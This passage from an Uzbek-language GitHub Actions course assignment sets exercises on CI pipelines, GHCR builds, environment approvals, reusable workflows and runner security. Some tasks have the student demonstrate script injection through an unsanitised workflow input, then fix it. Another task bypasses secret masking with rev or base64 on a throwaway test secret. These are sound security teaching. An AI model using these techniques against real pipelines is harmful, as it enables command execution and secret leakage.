13. **Script injection.** `debug.yml` ga `workflow_dispatch` input'ini `run` ichida `${{ inputs.msg }}` sifatida to'g'ridan ishlatadigan step qo'shing. Shunday input beringki, runner'da qo'shimcha buyruq (`id` yoki `ls`) bajarilsin. Keyin `env` orqali tuzating va xuddi shu input endi zararsiz ekanini ko'rsating. Mexanizmni izohlang. Yo'nalish: 4-bo'lim, "Script injection".

14. **Secrets and masking.** `gh secret set DEMO_SECRET` va `gh variable set DEMO_VAR` qiling (secret qiymati o'ylab topilgan sinov satri bo'lsin, haqiqiy parol emas; uni buyruq argumentiga yozmang, `gh` o'zi so'raydi). Workflow'da ikkalasini chop eting, log'da nima ko'rinadi? Secret'ni `rev` yoki `base64` orqali o'tkazib chop eting. Xulosa yozing va shu zahoti secret'ni o'chiring. Fork'dan kelgan PR'da `secrets.DEMO_SECRET` qiymati nima bo'lishini hujjatdan toping. Yo'nalish: 7-bo'lim, "Secret va variable"; 8-bo'lim, "Fork PR va `pull_request_target`".

### D. Image va deploy darvozasi

15. **Build and push to GHCR.** `build` job'i qo'shing: `lint` va `test` dan keyin image quradi, PR'da faqat build, `main` da `ghcr.io/<owner>/cicd-demo:<sha>` ga push. Faqat `GITHUB_TOKEN` ishlating, PAT yo'q. Push'dan keyin lokal mashinada `docker pull` va `docker run` qilib `/version` ni tekshiring (private package uchun avval `docker login ghcr.io`; macOS'da platforma ogohlantirishini yozing va sababini izohlang, multi-platform build ixtiyoriy). Image digest'ini yozing. Yo'nalish: 10-bo'lim.

16. **Layer cache.** Build'ga `type=gha` cache qo'shing. Faqat `app/` dagi bitta faylni o'zgartirgan commit'da qaysi layer'lar cache'dan olinganini log'dan ko'rsating. `package.json` o'zgarganda nima bo'ladi? Build vaqtlarini taqqoslang. Yo'nalish: 10-bo'lim, "Layer cache" bandi; docker moduli, 2-dars.

17. **Environment approval.** `staging` va `production` environment'larini yarating. `production` ga o'zingizni required reviewer va deployment branch sifatida faqat `main` ni qo'ying. Hozircha deploy o'rnida `echo` qiladigan ikki job yozing: `staging` avtomatik, `production` tasdiqdan keyin. Har environment'ga bir xil nomli, turli qiymatli variable qo'ying va job to'g'risini olishini ko'rsating. Feature branch'dan `production` job'ini ishga tushirishga urinib ko'ring va xatoni yozing. Yo'nalish: 7-bo'lim, "Environment va approval".

18. **Reusable workflow.** Build va push qismini `.github/workflows/build.yml` (`on: workflow_call`, input: image nomi, output: tag) ga chiqaring va `ci.yml` dan chaqiring. Keyin Node o'rnatish va cache step'larini `.github/actions/setup/action.yml` composite action'ga chiqaring. Qaysi biri qachon mos ekanini o'z tajribangiz asosida yozing. Yo'nalish: 9-bo'lim, "Mexanizm".

19. **Self-hosted runner analysis.** Runner o'rnatmasdan, hujjat asosida yozing: self-hosted runner GitHub bilan qaysi yo'nalishda ulanadi, nima uchun public repo'da xavfli (aniq hujum qadamlari bilan), doimiy runner'da job'lar orasida nima saqlanib qoladi, ephemeral rejim buni qanday hal qiladi. Ixtiyoriy: private sinov reposiga konteyner yoki VM ichida runner ulab, `runs-on: self-hosted` job'ini ishga tushiring va oxirida o'chiring (runner shu mashinaga bog'liq: boshlagan mashinangizda tugating va o'chiring; Mac'da ARM64 variant). Yo'nalish: 12-bo'lim.

20. **Full pipeline.** Yakuniy `ci.yml`: `lint` va `test` (matrix, cache) parallel, keyin `build` (reusable, GHCR push faqat `main` da), keyin `deploy-staging` (avtomatik), keyin `deploy-production` (approval). Har job minimal `permissions` bilan, action'lar SHA bilan, PR uchun `cancel-in-progress`. Run grafining ko'rinishini va PR'dan `main` gacha to'liq oqim vaqtini `README.md` ga yozing. Bu fayl 3–5-darslar uchun asos. Yo'nalish: butun dars.

### Topshirish

Tayyor bo'lgach:
1. `cicd/02-github-actions/README.md` da 20 ta vazifaning har biri `## N. Title` sarlavhasi ostida, run havolalari bilan.
2. Ish papkasida `cicd-demo` dagi fayllarning yakuniy nusxasi: `ci.yml`, `build.yml`, `debug.yml`, `dependabot.yml` va composite `action.yml`.
3. `actionlint` barcha workflow'larda toza.
4. `main` dagi oxirgi run yashil, `production` job'i approval kutgan va tasdiqlangan.
5. GHCR'da commit SHA bilan teglangan image bor, `latest` ga tayanilmagan; sinov package versiyalari o'chirilgan.
6. `DEMO_SECRET` o'chirilgan (`gh secret list`), repo'da, artifact'larda va log'larda hech qanday haqiqiy secret yo'q.
7. Self-hosted runner ulangan bo'lsa: Settings → Actions → Runners ro'yxati bo'sh, `docker ps -a` da uning konteyneri yo'q. `hello-ci` sinov reposi o'chirilgan.
8. `make check` toza. Menga xabar bering, repo havolasini qo'shing.

### O'zini tekshirish savollari (kodsiz, o'z so'zingiz bilan javob bering)

- Job va step orasidagi farq nima? Fayllar qaysi darajada bo'lishiladi va nima uchun job'lar orasida yo'q?
- `uses: owner/repo@ref` runner'da nimaga aylanadi? Bu npm dependency'dan nimasi bilan farq qiladi?
- `${{ }}` ifodasi qayerda va qachon hisoblanadi? Script injection shundan qanday kelib chiqadi?
- `GITHUB_TOKEN` PAT'dan nimasi bilan xavfsizroq? `permissions` yozilganda sanalmagan scope'lar nima bo'ladi?
- Nima uchun uchinchi tomon action'i tag emas, SHA bilan pin qilinadi?
- Fork'dan kelgan PR'ga secret'lar nima uchun berilmaydi? `pull_request_target` buni qanday o'zgartiradi?
- Cache kalitida `hashFiles('**/package-lock.json')` nima uchun kerak? `restore-keys` nima qiladi? Cache va artifact farqi nima?
- Environment'ning required reviewers qoidasi 1-darsdagi qaysi tushunchani amalga oshiradi?
- Reusable workflow va composite action farqi nima?
- Nima uchun deploy job'ida `cancel-in-progress: true` xavfli?
- Self-hosted runner public repo'da nima uchun xavfli? Ofisda qoldirilgan runner'ga bog'langan job uydan push qilinsa nima bo'ladi?
- CI'da qurilgan image Mac'da nima uchun ogohlantirish bilan ishlaydi va buni workflow darajasida nima hal qiladi?
